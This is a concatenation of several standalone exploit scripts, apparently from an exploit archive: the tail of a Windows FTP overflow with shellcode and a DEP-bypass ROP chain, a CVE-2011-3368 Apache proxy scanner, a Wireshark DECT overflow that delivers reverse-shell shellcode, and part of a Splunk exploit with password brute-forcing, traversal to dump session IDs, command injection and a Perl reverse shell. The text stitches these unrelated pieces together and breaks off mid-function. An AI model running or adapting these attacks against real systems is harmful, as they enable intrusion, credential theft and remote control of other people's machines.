"\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
"\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
"\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
"\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
"\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
"\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
"\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
"\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
"\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
"\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
"\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
"\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
"\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
"\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
"\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
"\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
"\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
"\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
"\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
"\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
"\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
"\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a")

buffer = "\x41" * 230
eip = pack('<L',0x77f613ac)		# RETN - shlwapi
rop = "\x42" * 8			# compensate
rop += pack('<L',0x77c2362c)		# POP EBX, RETN - msvcirt
rop += "\xff\xff\xff\xff"
rop += pack('<L',0x77c127e1)		# INC EBX, RETN
rop += pack('<L',0x5d093466)		# POP EBP, RETN
rop += pack('<L',0x7c8622a4)		# SetProcessDEPPolicy 
rop += pack('<L',0x5d095470)		# POP EDI, RETN
rop += pack('<L',0x5d095471)		# RETN
rop += pack('<L',0x5d0913b4)		# POP ESI, RETN
rop += pack('<L',0x5d095471)            # RETN
rop += pack('<L',0x77e7d102) 		# PUSHAD # RETN - RPCRT4



nops = "\x90" * 10
junk = "\x42" * (1000 - len(buffer + eip + rop + nops + shellcode))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d" % (target,port)
try:
	s.connect((target,port))
	s.recv(1024)
	print "[+] Sending payload"
	s.send("USER " + buffer + eip + rop + nops + shellcode + junk + "\r\n")
	s.close()
	print "[+] Exploit successfully sent"
except:
	print "[X] Unable to connect to %s" % target

raw_input("[+] Press any key to exit\n")
#!/usr/bin/env python

import socket
import string
import getopt, sys


known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]

def send_request(url, apache_target, apache_port, internal_target, internal_port, resource):

	get = "GET " + url + "@" + internal_target + ":" + internal_port +  "/" + resource + " HTTP/1.1\r\n"
	get = get + "Host: " + apache_target + "\r\n\r\n"
	
	remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	remoteserver.settimeout(3)

	try:
		remoteserver.connect((apache_target, int(apache_port)))
		remoteserver.send(get)
		return remoteserver.recv(4096)
	except:
		return ""

def get_banner(result):
	return result[string.find(result, "\r\n\r\n")+4:]


def scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):

	print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)
	for port in tested_ports:
		port = str(port)
		result = send_request(url, apache_target, apache_port, internal_target, port, resource)
		if string.find(result,"HTTP/1.1 200")!=-1 or \
		string.find(result,"HTTP/1.1 30")!=-1 or \
		string.find(result,"HTTP/1.1 502")!=-1:
			print "- Open port: " + port + "/TCP"
			print get_banner(result)
		elif len(result)==0:
	 		print "- Filtered port: " + port + "/TCP"
		else:
	 		print "- Closed port: " + port + "/TCP"
			

def usage():
	print
	print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
	print "http://www.secforce.co.uk"
	print
	print "usage():"
	print "python apache_scan.py [options]"
	print
	print " [options]"
	print "		-r: Remote Apache host"
	print "		-p: Remote Apache port (default is 80)"
	print "		-u: URL on the remote web server (default is /)"
	print "		-d: Host in the DMZ (default is 127.0.0.1)"
	print "		-e: Port in the DMZ (enables 'single port scan')"
	print "		-g: GET request to the host in the DMZ (default is /)"
	print "		-h: Help page"
	print
	print "examples:"
	print " - Port scan of the remote host"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif"
	print " - Port scan of a host in the DMZ"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local"
	print " - Retrieve a resource from a host in the DMZ"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html"
	print

def print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):
	print
	print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
	print "http://www.secforce.co.uk"
	print
	print " [+] Target: " + apache_target
	print " [+] Target port: " + apache_port
	print " [+] Internal host: " + internal_target
	print " [+] Tested ports: " + str(tested_ports)
	print " [+] Internal resource: " + resource
	print


def main():

	global apache_target
	global apache_port
	global url
	global internal_target
	global internal_port
	global resource

	try:
		opts, args = getopt.getopt(sys.argv[1:], "u:r:p:d:e:g:h", ["help"])
	except getopt.GetoptError:
		usage()
		sys.exit(2)

	try:
		for o, a in opts:
			if o in ("-h", "--help"):
				usage()
				sys.exit(2)
			if o == "-u":
				url=a
			if o == "-r":
				apache_target=a
			if o == "-p":
				apache_port=a
			if o == "-d":
				internal_target = a
			if o == "-e":
				internal_port=a
			if o == "-g":
				resource=a				
		
	except getopt.GetoptError:
		usage()
		sys.exit(2)
		
	if apache_target == "":
		usage()
		sys.exit(2)


url = "/"
apache_target = ""
apache_port = "80"
internal_target = "127.0.0.1"
internal_port = ""
resource = "/"

main()

if internal_port!="":
	tested_ports = [internal_port]
else:
	tested_ports = known_ports

scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)


#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-

a = """
\n\t-- CVE: 2011-1591 : Wireshark <= 1.4.4 packet-dect.c dissect_dect() --\n
#
# -------- Team     : Consortium-of-Pwners
# -------- Author   : ipv
# -------- Impact   : high
# -------- Target   : Archlinux wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
# -------- Description
#
# This code exploits a remote stack based buffer overflow in the DECT dissector of
# wireshark. ROP chains aims to recover dynamically stack address, mprotect it and stack pivot to 
# shellcode located the payload. 
# All the process is automated, and bypass any NX/ALSR.
#
# Operating Systems tested : [see the summary] with scapy >= 2.5
# For any comments, remarks, news, please mail me : ipv _at_ [team] . net
###########################################################################\n"""


import sys, struct
if sys.version_info >= (2, 5):
   from scapy.all import *
else:
   from scapy import *

# align
def _x(v):
    return struct.pack("<I", v)

# Gadget Table - Arch linux v2010.05 default package 
#   - wireshark-cli-1.4.3-1-i686.pkg.tar.xz  
#   - wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
arch_rop_chain  = [

    # Safe SEIP overwrite
    _x(0x8069acb),                      # pop   ebx ;   pop esi ;   pop ebp
    _x(0), _x(0x80e9360), _x(0),        # fake (arg1, arg2, arg3), to avoid crash

    # mprotect 1st arg : stack & 0xffff0000
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x80f9d7f),                      # xchg ecx, eax
    _x(0x8061804),                      # pop eax
    _x(0xffff0000),                     # 
    _x(0x80c69f0),                      # xchg edi, eax
    _x(0x80ff067),                      # and ecx edi ; dec ecx  
    _x(0x8077c53),                      # inc ecx ; sub al 0x5d 
    _x(0x8061804),                      # pop eax
    _x(0x7f16a5d0),                     # avoid crash with dec dword [ecx-0x76fbdb8c] 
    _x(0x8048360),                      # xchg ecx eax 
    _x(0x8089f46),                      # xchg edx eax ; std ; dec dword [ecx-0x76fbdb8c] 
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x8067d92)*7,                    # ret
    # 1st arg of mprotect is on esp+48 address (see below)
    _x(0x80745f9),                      # mov [eax+0x50] edx ; pop ebp
    _x(0),

    # we search address of mprotect (@mprotect = @fopen + 0x6fe70) 
    _x(0x8065226),                      # pop eax 
    _x(0x81aca20-0xc),                  # got[fopen]
    _x(0x8074597),                      # mov eax [eax+0xc] 
    _x(0x8048360),                      # xchg ecx eax 
    _x(0x8065226),                      # pop eax 
    _x(0x6fe70),
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x806973d),                      # add ecx ebp 
    _x(0x08104f61),                     # jmp *%ecx
    _x(0x0811eb63),                     # pop ebx, pop esi, pop edi
    # mprotect args (base_addr, page size, mode)
    _x(0),                              # Stack Map that is updated dynamically (see upper)
    _x(0x10000),                        # PAGE size 0x1000 
    _x(0x7),                            # RWX Mode
    
    # now we can jump to our lower addressed shellcode by decreasing esp register 
    _x(0x8061804),                      # pop eax 
    _x(0xff+0x50),                      # esp will be decreased of 0xff + 0x50 bytes;
    _x(0x80b8fc8),                      # xchg edi eax 
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x80acc63),                      # sub ebp, edi ; dec ecx
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x0806979e)                      # jmp *eax
]

# Gadget Table - Bt4 compiled without SSP/FortifySource
# Source wireshark 1.4.3
labs_rop_chain = [
    
    # Safe SEIP overwrite
    _x(0x08073fa1),                     # pop    ebx    ;    pop    esi    ;    pop    ebp
    _x(0), _x(0x0808c4d3), _x(0),       # fake (arg1, arg2, arg3), to avoid crash
    
    # sys_mprotect : eax=125(0x7D) ; ebx=address base ; ecx = size page ; edx = mode
    # mprotect 3r d arg
    _x(0x080e64cf),                     # pop edx ; pop es ; add cl cl
    _x(0x7), _x(0x0),                   # RWX mode 0x7

    # mprotect 1st arg (logical AND with stack address to get address base),
    _x(0x080a1711),                     # mov edi esp ; dec ecx 
    _x(0x0815b74f),                     # pop ecx 
    _x(0xffff0000),                     # 
    _x(0x0804c73c),                     # xchg ecx eax 
    _x(0x080fadd7),                     # and edi eax ; dec ecx
    _x(0x0804c73c),                     # xchg ecx eax 
    _x(0x080af344),                     # mov ebx edi ; dec ecx 
    
    # mprotect 2nd arg
    _x(0x0815b74f),                     # pop ecx
    _x(0x10000),                        # PAGE size 0x10000

    # int 0x80 : here vdso is not randomized, so, we use it!
    _x(0x80d8b71),                      # pop eax 
    _x(0x7D),                           # 0x7D = mprotect syscall
    _x(0x804e6df),                      # pop *esi
    _x(0xffffe411),                     # int 0x80 
    
    # _x(0xffffe414),                   # @sysenter in .vdso
    _x(0x080ab949),                     # jmp *esi
    
    # now we can jump to our lower addressed shellcode by decreasing esp register 
    _x(0x0815b74f),                     # pop ecx 
    _x(256),                            # esp will be decreased of 256bytes
    _x(0x080a1711),                     # mov edi esp ; dec ecx 
    _x(0x081087d3),                     # sub edi ecx ; dec ecx 
    _x(0x080f7cb1)                      # jmp *edi
]

addr_os = {
    # ID # OS                        # STACK SIZE      # GADGET TABLE
    1  : ["Arch Linux 2010.05    ",  0xb9,             arch_rop_chain], # wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
    2  : ["Labs test             ",  0xbf,             labs_rop_chain],
	-1 : ["Debian 5.0.8 Lenny    ",  -3,               False],			# wireshark_1.0.2-3+lenny12_i386.deb
    -2 : ["Debian 6.0.2 Squeeze  ",  -1,               False],			# wireshark_1.2.11-6+squeeze1_i386.deb	
    -3 : ["Fedora 14             ",  -1,               False],			# wireshark-1.4.3-1.2.2.i586.rpm
    -4 : ["OpenSuse 11.3         ",  -1,               False],			# wireshark-1.4.3-1.2.2.i586.rpm
    -5 : ["Ubuntu 10.10 | 11.04  ",  -1,               False],			# 
    -6 : ["Gentoo *              ",  -2,               False]			# 
}

print a

def usage():
    print "Please select and ID >= 0 :\n"
    print "   ID    TARGET                        INFO"
    print "--------------------------------------------------------------------"
    for i in addr_os.iteritems():
        print "  %2d  -- %s       "%(i[0], i[1][0]), 
        if i[1][1] == -1:
            print "Default package uses LibSSP & Fortify Source"
        elif i[1][1] == -2:
            print "Compiled/Build with Fortify Source"
        elif i[1][1] == -3:
            print "DECT protocol not supported"
        else:
            print "VULN -> Stack size %d"%(i[1][1])

    sys.exit(1)

if len(sys.argv) == 1:
    usage()
elif addr_os.has_key(int(sys.argv[1])) is False:
    usage()
elif int(sys.argv[1]) < 0:
    usage()

target = addr_os[int(sys.argv[1])]
print "\n[+] Target : %s"%target[0]

rop_chain = "".join([ rop for rop in target[2]])

# msfpayload linux/x86/shell_reverse_tcp LHOST=127.0.0.1 C
rev_tcp_shell = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x53\x6a\x10\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


SEIP_SMASH = target[1]
print "\t[+] Length for smashing SEIP : 0x%x(%d)"%(SEIP_SMASH, SEIP_SMASH)

nopsled = "\x90"
head_nop = 50
shellcode = nopsled * head_nop + rev_tcp_shell + nopsled * (SEIP_SMASH-len(rev_tcp_shell) - head_nop)
payload = shellcode + rop_chain
# stack alignment
if (len(payload) % 2):
    diff = len(payload) % 2
    payload = payload[(2-diff):]
    
print "\t[+] Payload length : %d"%len(payload)

evil_packet = Ether(type=0x2323, dst="ff:ff:ff:ff:ff:ff") / payload
# evil_packet.show()

print "\t[+] Evil packet length : %d"%len(evil_packet)

print "\t[+] Sending packet to broadcast"
sendp(evil_packet)


 
from sec1httplib.requestbuilder import Requestobj
from sec1httplib.thread_dispatcher import *
import threading
import re
import urlparse
import sys
import urllib
import base64
from optparse import OptionParser
import sys


"""
Source: http://www.sec-1.com/blog/?p=233

Splunk remote root exploit.

Author: Gary O'leary-Steele @ Sec-1 Ltd
Date:   5th September 2011
Release date: Private

Full Package: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/18245.zip

C:\git\splunk>python splunk_exploit.py -h
Usage: Run splunk_exploit.py -h to see usage options

Options:
  --version          show program's version number and exit
  -h, --help         show this help message and exit
  -t TARGETHOST      IP Address or hostname of target splunk server
  -c                 Generate CSRF URL only
  -w SPLUNKWEB_PORT  The Splunk admin interface port (Default: 8000)
  -d SPLUNKD_PORT    The Splunkd Web API port (Default: 8089)
  -u USERFILE        File containing usernames for use in dictionary attack
  -p PASSFILE        File containing passwords for use in dictionary attack
  -U USERNAME        Admin username (if known)
  -P PASSWORD        Admin pasword (if known)


ToDo: Fix bug when attemping to get home dir

"""

#Set this to use a proxy
#Requestobj.set_proxy("127.0.0.1","8080")

Requestobj.verbose = 0
misc_lock = threading.Lock()

# Counter used in bruteforce
class Counter():
    def __init__(self):
        self.l = threading.Lock()

    def set_total(self,total):
        self.statictotal = total
        self.total = total
    def sub(self):
        with self.l:
            if self.total !=0:
                self.total = self.total - 1
    def print_remaining(self):
        with self.l:
            print "[i] %s of %s remaining" % (self.total,self.statictotal)
counter = Counter()

def request_factory_splunkd(targeturl,username,password,splunk_object):
    "Factory to generate attempt_login functions"
    global counter
    def attempt_login():
        # Dont continue if we already have admin
        if splunk_object.got_admin == 1:
            return False

        login_url = "{0}/services/auth/login".format(targeturl.rstrip())
        r = Requestobj(login_url)
        poststr = "username={0}&password={1}".format(username.rstrip(),password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        counter.sub()
        counter.print_remaining()
 

        if result.find_data("Remote login disabled because you are using a free license"):
            print "[i] Free licence in use. No remote login required"
            print "[!] run the exploit again with the -f flag"
            sys.exit()
        
        if result.find_data("sessionKey"):
            print "[***] Cracked: %s:%s\n" % (username.rstrip(),password.rstrip())
            try:
                if splunk_object.user_is_admin(username.rstrip(),password.rstrip()):
                    splunk_object.username = username.rstrip()
                    splunk_object.password = password.rstrip()
                    splunk_object.got_admin =1
                    #print "ADMIN",splunk_object.got_admin
                    splunk_object.session_key = re.findall("<sessionKey>(.+?)</sessionKey>",result.body)[0]
            except Exception as err:
                print "[i] Error getting auth details",err

            return (username,password)
        else:
            pass
    return attempt_login


def request_factory_splunkweb(targeturl,username,password,cval,splunk_object):
    "Factory to generate attempt_login functions"
    global counter

    def attempt_login():
        if splunk_object.got_admin == 1:
            return False

        login_url = "{0}/en-GB/account/login".format(targeturl.rstrip())
        r = Requestobj(login_url)
        poststr = "cval={0}&return_to=%2Fen-GB%2F&username={1}&password={2}".format(cval,username.rstrip(),password.rstrip())
        r.rawpostdata("POST", poststr)
        r.set_custom_cookie(copyglobaljar=1)
        result = r.makerequest()
        counter.sub()
        counter.print_remaining()

            
        if result.find_data("This resource can be found at"):
            print "[***] Cracked: %s:%s" % (username.rstrip(),password.rstrip())
            try:
                if splunk_object.user_is_admin(username.rstrip(),password.rstrip()):
                    splunk_object.username = username.rstrip()
                    splunk_object.password = password.rstrip()
                    splunk_object.got_admin =1
            except Exception as err:
                print "[i] Error getting auth details",err

            return (username,password)
        else:
            pass
    return attempt_login



class SplunkTarget(object):
    def __init__(self,hostaddr,splunkd_port=8089,splunkweb_port=8000):
        
        self.splunkd_port = splunkd_port
        self.splunkweb_port = splunkweb_port
        self.max_threads = 20
        self.username=""
        self.password = ""
        self.session_key =""
        self.splunk_home = ""
        self.got_admin = 0
        self.web_authed = 0 # are we authed to the web interface
        self.freelic =0
        # Check splunkd server
        info = Requestobj("https://{0}:{1}/services/server/info/server-info".format(hostaddr,splunkd_port)).makerequest()
        if info.body:
            self.splunkd_url = "{0}://{1}".format(urlparse.urlparse(info.url).scheme,urlparse.urlparse(info.url).netloc)
        else:
            info = Requestobj("http://{0}:{1}/services/server/info/server-info".format(hostaddr,splunkd_port)).makerequest()
            self.splunkd_url = "{0}://{1}".format(urlparse.urlparse(info.url).scheme,urlparse.urlparse(info.url).netloc)

        if "server-info" in info.body:
 
            self.splunkd =1
            try:
                self.os_build = re.findall("os_build\">(.+?)<",info.body)[0]
                self.os_name = re.findall("os_name\">(.+?)<",info.body)[0]
                self.os_version = re.findall("os_version\">(.+?)<",info.body)[0]
                self.server_name = re.findall("serverName\">(.+?)<",info.body)[0]
                self.splunk_version = re.findall("\"version\">(.+?)<",info.body)[0]
                self.cpu_arch = re.findall("cpu_arch\">(.+?)<",info.body)[0]
                print "[i] Splunkd server found. Version:{0}".format(self.splunk_version)
                print "[i] OS:{0} {1} {2}".format(self.os_name,self.os_version,self.os_build)
            except Exception as err:
                print "Error getting splunk server info",err
        else:
            self.splunkd =0


        # Check splunk web
        splunkweb_info = Requestobj("http://{0}:{1}/en-GB/account/login".format(hostaddr,splunkweb_port)).makerequest()
        if splunkweb_info.body:
            self.splunkweb_url = "{0}://{1}".format(urlparse.urlparse(splunkweb_info.url).scheme,urlparse.urlparse(splunkweb_info.url).netloc)
        else:
            splunkweb_info = Requestobj("https://{0}:{1}/en-GB/account/login".format(hostaddr,splunkweb_port)).makerequest()
            self.splunkweb_url = "{0}://{1}".format(urlparse.urlparse(splunkweb_info.url).scheme,urlparse.urlparse(splunkweb_info.url).netloc)


        if "Splunk" in splunkweb_info.body:
            print "[i] Splunk web interface discovered"
            self.splunkweb =1
            self.cval=""
            try:
                self.cval = splunkweb_info.extract_data_body('name="cval" value="(\d+?)"')[0]
                print "[i] CVAL:{0}".format(self.cval)
            except:
                print "[i] Error getting cval"
                self.splunkweb =0

        else:
            self.splunkweb =0

        if self.splunkweb ==1:
            try:
                url ="{0}/en-GB/manager/system/licensing".format(self.splunkweb_url)
                lic = Requestobj(url).makerequest()
                if "<h1>Free license group</h1>" in lic.body:
                    print "[i] Configured with free licence. No auth required"
                    #if not self.splunkd:
                    #    print "[i] Cannot connect to splunkd using free licence"
                    #    sys.exit()
                    self.got_admin=1
                    self.username="admin"
                    self.password="admin"
                    self.web_authed=1
                    self.splunkd=0
                    self.freelic=1
                    self.pop_shell()

            except Exception as err:
                print "error",err
                exit()
    
    def account_bruteforce(self,userfile,passfile):
        global counter
        q = ThreadDispatcher(store_return=1,max_threads=self.max_threads)
        for username in set(open(userfile).readlines()):
            for password in set(open(passfile).readlines()):

                if self.splunkd == 1:
                    q.add(request_factory_splunkd(self.splunkd_url,username,password,self))
                elif self.splunkweb==1:
                    q.add(request_factory_splunkweb(self.splunkweb_url,username,password,self.cval,self))
                else:
                    print "[Error] Not connected"
                    sys.exit()

        counter.set_total(len(q.call_queue))
        q.start()

        for x in range(q.return_queue._qsize()):
            username, password = q.return_queue.get(x)
            username = username.rstrip()
            password = password.rstrip()
            print "[***] Cracked: %s:%s" % (username,password)


    def user_is_admin(self,username,password):
        if self.splunkd == 1:
            # attempt to auth via splunkd to get a sessionkey
            self.username = username
            self.password = password
            self.splunkd_auth()
            url = Requestobj("{0}/services/authentication/httpauth-tokens".format(self.splunkd_url))
            url.basic_auth(username,password)

            context = url.makerequest()
            
            if '<title>httpauth-tokens' in context.body:
                self.got_admin =1
                return True
            else:
                return False
        elif self.splunkweb == 1:
            with misc_lock:
                self.username = username
                self.password = password
                if self.splunkweb_auth():
                    admin_only = Requestobj("{0}/en-US/manager/launcher/server/settings/settings?action=edit".format(self.splunkweb_url)).makerequest()
                    if admin_only.find_data("Port that Splunk Web uses"):
                        print "[i] User:{0} IS AN ADMIN.".format(username)
                        return True
                    else:
                        print "[i] User:{0} is not an admin".format(username)
                else:
                    pass
                
        else:
            print "Not Connected"
            return False


    def search_payload_cmd(self,payload):
        "Generate a command execution payload"
        encoded = urllib.quote(base64.b64encode(payload))
        encodedpl = """search index=_internal source=*splunkd.log |mappy x=eval("sys.modules['os'].system(base64.b64decode('%s'))")""" % encoded
        #print encodedpl
        return encodedpl


    def get_splunk_home(self):
        if not self.username or not self.password:
            print "[i] Valid username and password required"
            sys.exit()
        try:
            r = Requestobj("{0}/services/properties/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopt%2fsplunk%2fetc%2fsplunk-launch/default/SPLUNK_HOME".format(self.splunkd_url))
            r.basic_auth(self.username,self.password)
            splunkdir =  r.makerequest()

            if "ERROR" not in splunkdir.body and "Remote login disabled" not in splunkdir.body and self.splunkd:
                self.splunk_home = splunkdir.body.strip()
            else:
                print "[***] Could not get home dir setting default.."
                if "windows" in self.os_name.lower():
                    self.splunk_home = "c:\\program files\\splunk"
                else:
                    self.splunk_home = "/opt/splunk"

                print "Setting Splunk home dir to:{0}".format(self.splunk_home)

            return self.splunk_home

        except Exception as err:
            print "[i] Error occured while attempting to read splunk home dir",err
            

    def splunkd_auth(self):
        login_url = "{0}/services/auth/login".format(self.splunkd_url)
        r = Requestobj(login_url)
        poststr = "username={0}&password={1}".format(self.username.rstrip(),self.password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        if result.find_data("Remote login disabled because you are using a free license"):
            print "[i] Free licence in use. No remote login required"
            print "[!] run the exploit again with the -f flag"
            sys.exit()

        if result.find_data("sessionKey"):
            self.session_key = re.findall("<sessionKey>(.+?)</sessionKey>",result.body)[0]
            return True
        else:
            return False


    def splunkweb_auth(self):

        if self.web_authed == 1:
            return True

        login_page = Requestobj("{0}/en-GB/account/login".format(self.splunkweb_url)).makerequest() # Get session cookie
        
        cval=""
        cval = login_page.extract_data_body('name="cval" value="(\d+?)"')
        if cval:
            cval = cval[0]
        r = Requestobj(login_page.url)
        poststr = "cval={0}&return_to=%2Fen-GB%2F&username={1}&password={2}".format(cval,self.username.rstrip(),self.password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        
        if result.find_data("This resource can be found at"):
            return True
            self.web_authed = 1
        else:
            print "[i] Login Failed"
            exit()

    def add_admin(self,username,password,sessionKey):
        # look for 201
        if self.splunkd == 1 and self.username and self.password:
            url = Requestobj("{0}/servicesNS/-/launcher/authentication/users".format(self.splunkd_url))
            url.basic_auth(self.username,self.password)
            url.rawpostdata("POST","roles=user&roles=admin&name={0}&defaultApp=search&password={1}&email=&createrole=0&realname=".format(username,password))
            url.add_header("authorization","Splunk {0}".format(sessionKey))
            result = url.makerequest()
            if str(result.code) == "201":
                return True
            else:
                return False

        else:
            print "[!] Not connected to splunkd. Check port and creds"
            return False

    def dump_session_ids(self):
        "Exploits dir traversal issue to dump session ids"
        print "[i] Attemping to dump sessions"
        if self.splunkd == 1 and self.username and self.password:
            #url = Requestobj("{0}/servicesNS/-/system/properties/..%2f..%2f..%2f..%2f..%2fopt%2fsplunk%2fvar%2flog%2fsplunk%2fweb_service.log%00/default".format(self.splunkd_url))
            url = Requestobj("{0}/servicesNS/-/system/properties/..%2f..%2f..%2fvar%2flog%2fsplunk%2fweb_service.log%00/default".format(self.splunkd_url))

            url.basic_auth(self.username,self.password)
            result = url.makerequest()
            sessions=[]
            if "session=" in result.body:
                print "[i] Session ID's extracted from web_service.log"
                sessions = re.findall("session=(.+?)[<\s]",result.body)
            for session in set(sessions):
                print "[SESSION]",session
            return set(sessions)

    def perl_revshell(self,revhost,port):
        cmd="""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (revhost,port)
        self.search_exploit_cmd(cmd)


    def search_exploit_cmd(self,command):
        "Execute commands via search exploit."

        if self.splunkweb == 1 and self.got_admin:
            if self.web_authed == 0:
                self.splunkweb_auth()
                
            print "[i] Executing Command:{0}".format(command)
            attack_body = self.search_payload_cmd(command)#
            attack_body = urllib.quote(urllib.unquote(attack_body))
            shell_req = Requestobj("{0}/en-GB/api/search/jobs".format(self.splunkweb_url))
            shell_req.rawpostdata("POST","search={0}&status_buckets=300&namespace=search&ui_dispatch_app=search&ui_dispatch_view=flashtimeline&auto_cancel=100&required_field_list=*&earliest_time=&latest_time=".format(attack_body))
            for c in shell_req.get_cookiejar():
                if "session" in c.name:
                    shell_req.add_header("X-Requested-With","XMLHttpRequest")
                    shell_req.add_header("X-Splunk-Session",c.value)
            x = shell_req.makerequest()

        elif self.splunkd == 1 and self.got_admin and self.session_key:

            print "[i] Executing Command:{0}".format(command)
            attack_body = self.search_payload_cmd(command)#
            attack_body = urllib.quote(urllib.unquote(attack_body))
            shell_req = Requestobj("{0}/servicesNS/admin/search/search/jobs".format(self.splunkd_url))
            shell_req.rawpostdata("POST","ui_dispatch_app=search&search={0}&required_field_list=%2A&ui_dispatch_view=flashtimeline&max_count=10000&time_format=%25s.%25Q&latest_time=&status_buckets=300&earliest_time=&auto_cancel=100".format(attack_body))
            shell_req.add_header("authorization","Splunk {0}".format(self.session_key))
            x = shell_req.makerequest()
        else:
            print "Session",self.session_key
            print "Admin",self.got_admin
            print "Splunkd",self.splunkd
            print "[i] Exploit failed. Not connected or access denied"

    def blind_shell(self):
        command=""
        while 1:
            print command.rstrip()
            command=raw_input("blind_shell>")#
            if command.rstrip() == "exit": break
            self.search_exploit_cmd(command)


    def get_csrf_link_cmd(self,command):
        return "{0}/en-US/app/search/flashtimeline?q={1}&earliest=0".format(self.splunkweb_url,self.search_payload_cmd(command))

    def get_csrf_link_revshell(self,revhost,port):
        cmd="""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (revhost,port)
        return "{0}/en-US/app/search/flashtimeline?q={1}&earliest=0".format(self.splunkweb_url,self.search_payload_cmd(cmd))

    def search_exploit_psudoshell(self):
        "Execute commands via search exploit. Payload implements a virtual shell"
        if not self.username or not self.password:
            print "[i] Valid username and password required"
            sys.exit()
        if not self.splunkweb == 1:
            print "[error] Managment Web Interface required for this payload"
            return ""
        
        if self.web_authed == 0:
            self.splunkweb_auth()

        base_dir = self.get_splunk_home()
        #if not base_dir:
        #    print "Failed to get splunk basedir"
        #    base_dir = "/opt/splunk"

        command=""
        while 1:
            print command.rstrip()
            command=raw_input("shell>")#
            if command.rstrip() == "exit": break

            if "windows" in self.os_name.lower():
                tmp = ">\"{0}\\share\splunk\search_mrsparkle\exposed\js\.tmp\"".format(base_dir)
                command = command + tmp #'"'+ tmp +'"'
            else:
                tmp = ">{0}/share/splunk/search_mrsparkle/exposed/js/.tmp".format(base_dir)
                command = command + tmp
            
            attack_body = self.search_payload_cmd(command)#

            attack_body = urllib.quote(urllib.unquote(attack_body))
            psudoshell_req = Requestobj("{0}/en-GB/api/search/jobs".format(self.splunkweb_url))
